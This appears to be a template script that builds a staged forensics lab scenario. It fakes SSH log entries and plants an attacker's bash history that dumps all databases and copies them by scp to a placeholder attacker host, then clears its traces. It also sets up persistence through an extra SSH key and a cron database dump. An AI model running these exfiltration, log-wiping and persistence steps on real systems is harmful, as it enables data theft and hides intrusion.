useradd -m -s /bin/bash {{USER}}
echo '{{USER}}:{{PW}}' | chpasswd
# the sign-in trail
: > /var/log/secure
echo "Mar  5 03:02:51 db3 sshd[6011]: Accepted password for {{USER}} from {{ATKIP}} port 49620 ssh2" >> /var/log/secure
echo "Mar  5 03:02:51 db3 sshd[6011]: pam_unix(sshd:session): session opened for user {{USER}}(uid=1000) by (uid=0)" >> /var/log/secure
echo "Mar  5 03:19:04 db3 sshd[6011]: pam_unix(sshd:session): session closed for user {{USER}}" >> /var/log/secure
# the account's bash history - the attacker's own commands, including an scp back to their box
mkdir -p /home/{{USER}}
cat > /home/{{USER}}/.bash_history <<HIST
id
cat /etc/passwd
mysqldump --all-databases > /tmp/all.sql
scp /tmp/all.sql nomad@{{ATKIP}}:/loot/
rm -f /tmp/all.sql
history -c
HIST
chown {{USER}}: /home/{{USER}}/.bash_history
# persistence 1: an extra SSH key added to the account
mkdir -p /home/{{USER}}/.ssh
cat > /home/{{USER}}/.ssh/authorized_keys <<KEYS
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI{{HEX:ATKIP}}0aaBcDeF {{USER}}@db3
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIQ9z{{SHA1:KEYCMT}}XyZ {{KEYCMT}}
KEYS
chown -R {{USER}}: /home/{{USER}}/.ssh
chmod 700 /home/{{USER}}/.ssh
chmod 600 /home/{{USER}}/.ssh/authorized_keys
# persistence 2: a scheduled beacon
cat > /etc/cron.d/{{CRONF}} <<CRON
*/10 * * * * {{USER}} /usr/bin/mysqldump --all-databases > /tmp/.x/db.sql 2>/dev/null
CRON
chmod 644 /etc/cron.d/{{CRONF}}
# persistence 3: a dropped note (the flag is placed here by the engine)
mkdir -p /var/tmp/.cache
chmod 755 /var/tmp/.cache
